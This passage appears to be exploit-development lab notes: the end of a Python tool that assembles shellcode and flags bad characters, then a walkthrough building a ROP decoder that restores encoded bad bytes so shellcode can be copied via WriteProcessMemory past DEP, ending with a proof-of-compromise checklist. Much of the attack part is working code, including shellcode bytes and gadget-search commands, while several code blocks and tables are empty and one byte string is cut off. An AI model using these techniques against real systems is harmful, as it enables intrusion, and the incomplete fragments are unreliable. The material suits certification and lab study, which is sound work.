        # Takes the string input and creates a list of bad characters
        badchars_list = []
        if badchars:
            # remove the first empty list item
            temp = badchars.split("\\x")[1:]
        else:
            temp = []
        for entry in temp:
            badchars_list.append("\\x" + entry.lower())
        return badchars_list
    
    def gen_ndisasm(code: list, base_address: str) -> list:
        # This will run the shellcode through ndisasm to produce opcodes.
        # This is needed for relative calls/jumps, etc because Keystone won't output
        # the opcodes for these relative calls, but ndisasm will.
        #
        # Once we have the nisasm output we split it into three parts, the address, opcode and
        # plain-text in instruction.
        #
        # The function returns a list of dictionaries with those three parts.
        #
        # base_address: String, e.g. "0x010000F8"
        results = []
        encoding, _ = compile_code(code)
        sh = b""
        for e in encoding:
            sh += struct.pack("B", e)
        shellcode = bytearray(sh)
        cmd = f"ndisasm -u -p intel -o {base_address} -"
        with subprocess.Popen(
            cmd.split(), stdin=subprocess.PIPE, stdout=subprocess.PIPE
        ) as p:
            output = p.communicate(input=shellcode)[0].decode()
        lines = output.splitlines()
        pattern = r"^([0-9,A-Z]{8})\b\s+([0-9,A-Z]+)\b\s+(.*?)$"
        for line in lines:
            m = re.search(pattern, line)
            opcodes = m.group(2)
            # Split the opcodes by 2 characters
            opcodes = [opcodes[i : i + 2] for i in range(0, len(opcodes), 2)]  # noqa
            # Add in the '\x' to each and join them
            opcodes = "".join(["\\x" + i.lower() for i in opcodes])
            results.append(
                {"address": m.group(1), "opcodes": opcodes, "instruction": m.group(3)}
            )
        return results
    
    def format_print_line(inst, opcode, counts, ndisasm_results, badchars):
        count = counts[0]
        function_count = counts[1]
        # Function name
        if ":" in inst:
            output = ""
            function_count += 1
            if count != 1:
                output = "\r\n"
            if os.name == "posix":
                output += f"{' ' * 9} {inst}"
            else:
                output += f"{inst}"
            return output, function_count
    
        spaces = SPACE_WIDTH - len(inst)
        if os.name == "posix":
            #print(count)
            #print(function_count)
           # print(ndisasm_results)
            index = ndisasm_results[count - function_count - 1]
            nd_opcode = index
    
        # Relative call - use output from ndisasm
        if os.name == "posix":
            if opcode == "":
                opcode = nd_opcode["opcodes"]
    
        # Define line to print
        if os.name == "posix":
            output = f"{nd_opcode['address']}; {inst} {' ' * spaces} {opcode}"
        else:
            output = f"{inst} {' ' * spaces} {opcode}"
    
        # Check for bad chars
        contains_badchars = [ele for ele in badchars if ele in opcode]
        if contains_badchars:
            bspaces = SPACE_WIDTH - len(opcode)
            output += f"{' ' * bspaces} *** {','.join(contains_badchars)}"
        return output, function_count
    
    def print_opcodes(code: list, badchars: list, base_address: str) -> None:
        # Prints out a table with the columns: address, instructions, opcodes and badchars.
        # Uses keystone output for all but the dynamic instructions. For dynamic instructions
        # the code uses `ndisasm`.
    
        ndisasm_results = []
    
        # Generate ndisasm results for relative opcodes
        if os.name == "posix":
            if base_address.startswith("0x"):
                base_address = int(base_address[2:], 16)
            else:
                base_address = int(base_address, 16)
            ndisasm_results = gen_ndisasm(code, base_address)
        # Generate opcodes using keystone
        
        opcodes = gen_opcodes(code)
        # Generate bad characters
        badchars = format_badchars(badchars)
    
        # Print headings
        print_section_title("Instructions/Opcodes/BadChars:")
        if os.name == "posix":
            print(f"Using a base address of: {base_address:#0{10}x}")
    
        # Setup counters
        count = 0
        function_count = 0
    
        # Loop through each line of instruction and print out the associated info
        for inst, opcode in opcodes:
            count += 1
            output, function_count = format_print_line(
                inst, opcode, (count, function_count), ndisasm_results, badchars
            )
    
            # print line
            print(output)
    
    def gen_opcodes(code: list) -> list:
        # Returns a list of tuple of instruction, and opcodes (if available)
        ks = Ks(KS_ARCH_X86, KS_MODE_32)
        results = []
        for inst in code:
            try:
                encoding, _ = ks.asm(inst)
            except KsError:
                inst_op = (inst, "")
            else:
                result = []
                for x in encoding:
                    result.append(f"\\x{x:02x}")
                inst_op = (inst, "".join(result))
            results.append(inst_op)
        return results
    
    def print_shellcode(code: list, badchars: str) -> None:
        # encode shellcode
        encoding, count = compile_code(code)
    
        # section information
        print(f"Encoded {count} instructions...")
        print_section_title("Your Shellcode:")
        print(f"# Shellcode is {len(encoding)} bytes")
    
        # format opcodes
        shell_hex = "".join([f"\\x{e:02x}" for e in encoding])
    
        # split code into chunks of 16
        chunk_size = 16 * 4  # 16 bytes (\xZZ) per line
        chunks = [
            shell_hex[chunk : chunk + chunk_size]  # noqa
            for chunk in range(0, len(shell_hex), chunk_size)
        ]
    
        # Check for bad characters
        badchars = format_badchars(badchars)
        contains_badchars = [ele for ele in badchars if ele in "".join(chunks)]
        if contains_badchars:
            print(f"**** Contains badchars: {', '.join(contains_badchars)} ****\r\n")
    
        # Print shellcode
        print(f'shellcode = b"{chunks[0]}"')
        for chunk in chunks[1:]:
            print(f'shellcode += b"{chunk}"')
    
    def compile_code(code: list) -> tuple:
        if isinstance(code, list):
            code = "".join(code)
        ks = Ks(KS_ARCH_X86, KS_MODE_32)
        encoding, count = ks.asm(code)
        return encoding, count
    
    def parse_args():
        parser = argparse.ArgumentParser(
            prog="shellchecker.py", description="Checks shellcode for bad chars and generates opcodes."
        )
        parser.add_argument(
            "-b", "--badchars", type=str, help="Bad Characters (format: '\\x00\\x0a')"
        )
        parser.add_argument(
            "-p",
            "--print-opcodes",
            action="store_true",
            help="Print the opcodes for each instruction.",
        )
    
        return parser.parse_args()
    
    def main(args):
        code = ccode
        print_shellcode(code, args.badchars)
        if args.print_opcodes:
            print_opcodes(code, args.badchars, '0x01000000')
    
    if __name__ == "__main__":
        _args = parse_args()
        main(_args)
    ```
    
    By reviewing our shellcode we identify the following occurrences of bad chars within the shellcode.
    
    ```python
    
    ```
    
    ```bash
    
    ```
    
- Automated ROP Encoding
    
    In order for our DEP evasion mechanism to function correctly, it's necessary to incorporate the decoding process directly within the ROP chain, thereby creating a ROP decoder. As we, and our shellcode, won't be granted write permissions following the transfer of the shellcode into the code cave via WPM, it's imperative that the decoding takes place prior to the invocation of WPM.
    
    We will utilise a simple technique that subtract a value from our bad characters for example, while doing this, keep track of the indices of the bad characters, so we can restore them later during run time. Let’s recap our bad chars: `\x00\x20`. The below table outlines the process. When restoring our characters we want to add a value to it.
    
    | Bad Char | EncodedChar | DecodeChartoAdd |
    | --- | --- | --- |
    | 0x20 | 0x1F | 0x01 |
    | 0x00 | 0xFF | 0x01 |
    
    The initial step involves identifying all the undesirable characters within the shellcode. The following Python script can assist in accomplishing this (*Note: In case of a different binary or memory region, make the necessary adjustments to the 'badchars' variable*).
    
    ```python
    def mapBadChars(sh):
        BADCHARS = b"\x00\x20" 
        print(str(sh))
        i= 0
        badIndex = []
        while i < len(sh):
                for c in BADCHARS:
                    if sh[i] == c:
                        badIndex.append(i)
                i=i+1
        return badIndex
    ```
    
    We can encode our shellcode using the following python code, which effectively replaces the bad chars with our new values as per the table summary. 
    
    ```python
    def encodeShellcode(shellcode):
        badchars = bytearray(b"\x00\x20")
        encodedchars = bytearray(b"\xff\x1f")
        encodedShellcode = shellcode
        for i in range(len(badchars)):
            encodedShellcode = encodedShellcode.replace(pack("B", badchars[i]), pack("B", encodedchars[i]))
        return encodedShellcode
    ```
    
    Next we need to incorporate the above into our shellcode and write our decoder. We require a pointer to our encoded shellcode, a perfect location is between the patching of the `LPBUFFER` and `NSIZE` location. 
    
    For our decoding routine which will take two arguments as input. Initially, we'll prepare a list of potential bad characters and their respective replacement characters. Then, we'll establish an accumulator variable (named restoreRop) that will hold the entire decoding ROP chain.
    
    Following this, we'll execute a loop over all the indices of the bad characters. For every entry, we'll compute the offset from the last bad character to the current one. We'll then negate this offset, assign it to the variable `neg_offset`, and utilize it in the ROP chain. To ascertain the value to be added to the substitute character, we'll implement an inner loop over all potential bad characters to identify which one exists at the corresponding index. Once located, this value is stored in the variable named `value`.
    
    As the content of `value` needs to be popped into BL|AL|BH, it should be left-shifted by 8 bits. This action results in a value that aligns with the AL|BH register but also includes NULL bytes. To counteract the NULL byte issue, we'll carry out an OR operation with a static value of `0x11110011`. Ultimately, this outcome is inscribed into the ROP chain where it will be popped into another register during execution.
    
    This intricate procedure facilitates custom encoding. Moreover, it enables us to decode the shellcode prior to its transfer to the non-writable code cave.
    
    ```python
    # AL register = 0x11111100 (value = value | 0x11110011)
    # BH register = 0x11110011 (value = (value << 8) | 0x11110011)
    
    def decodeShellcode(badIndex, shellcode):
        badchars = bytearray(b"\x00\x20")
        addencodedchars = bytearray(b"\x01\x01")
        restoreRop = b""
        for i in range(len(badIndex)):
            if i == 0:
                offset = badIndex[i]
            else:
                offset = badIndex[i] - badIndex[i-1]
            neg_offset = (-offset) & 0xffffffff
    
            value = None
            for j in range(len(badchars)):
                if shellcode[badIndex[i]] == badchars[j]:
                    value = encodedchars[j]
                    value = (value << 8) | 0x11110011
    
            restoreRop += pack("<L", (0xFFFFFFFF)) # POP VALUE
            restoreRop += pack("<L", (neg_offset)) # offset to the next bad char
            restoreRop += pack("<L", (0xFFFFFFFF)) # SUB OFFSET
            restoreRop += pack("<L", (0xFFFFFFFF)) # POP VALUE
            restoreRop += pack("<L", (value)) # values in AL
            restoreRop += pack("<L", (0xFFFFFFFF)) # add byte [ecx], al ; ret ;
    
        return restoreRop
    ```
    
    Given that a pointer to the shellcode located on the stack is necessary for its modification (or decoding), the optimal position to install the decoding process would be subsequent to the alteration of the `lpBuffer` argument. We will need to continue adjusting our offset for our shellcode set during `LPBUFFER` as our ROP changes to ensure we land within our NOP slides. 
    
    ```python
    [....]
    
    ########### ROP ENCODER ###########
    ## Bad chars:  \0x00\x0d\x20\x2b\x3d\x5e
    shellc = b"\x89\xe5\x81\xc4\xf0\xf9\xff\xff\x31\xc9\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x5e\x08\x8b\x7e\x20\x8b\x36\x66\x39\x4f\x18\x75\xf2\xeb\x06\x5e\x89\x75\x04\xeb\x54\xe"
    
    pos = mapBadChars(shellc)
    rop += decodeShellcode(pos, shellc)
    
    #Restore WPM prototype buffer for nSize patching
    
    ## NSIZE
    #adjust eax to align with nsize e.g. increase eax 0x04
    rop += pack("<L", (0xFFFFFFFF)) # inc eax ; ret  ; 
    rop += pack("<L", (0xFFFFFFFF)) # inc eax ; ret  ;
    [....]
    
    #####################
    ## NOP & Shellcode ##
    #####################
    # NOP Padding before shellcode, adjust as needed
    encodedShellcode = encode(shellcode)
    [....]
    ```
    
    Before we identify potential ROP gadgets for the decoding process, we recap our register values where our ROP Encoder are set to start.
    
    ```python
    
    ```
    
    | Register | Value | Description |
    | --- | --- | --- |
    | EAX |  |  |
    | EBX |  |  |
    | ECX |  |  |
    | EDX |  |  |
    | ESI |  |  |
    | EDI |  |  |
    | EBP |  |  |
    
    We effectively need to do the following now:
    
    - ECX points to our shellcode location
    - pop the offset of our current or next bad char into a register
    - subtract the negative offset
    - pop the value for our OR instruction into register
    - add lower sub register to our bad char
    
    ```python
    
    ```
    
    ```python
    
    gci .\rops\  -File -Recurse -EA SilentlyContinue | Select-String -Pattern "(add byte).*?((retn  ;)|(ret  ;))"
    
    gci .\rops\  -File -Recurse -EA SilentlyContinue | Select-String -Pattern "(sub).*?((retn  ;)|(ret  ;))"
    
    ```
    
    We update our shellcode as shown below. Next we step through the instructions to see if our encoder works.
    
    ```python
    	  
    ```
    
    Next we need to restore our registers once our ROP decoder is completed. The address for WPM is currently within `ESI`.
    
    ```python
    
    ```
    
    We run our payload as next we need to adjust our `lpBuffer` again by searching for our NOP slide then calculating the difference.
    
    ```bash
    
    ```
    

### 11. Proof.txt

The following is required:

- type proof.txt
- ipconfig
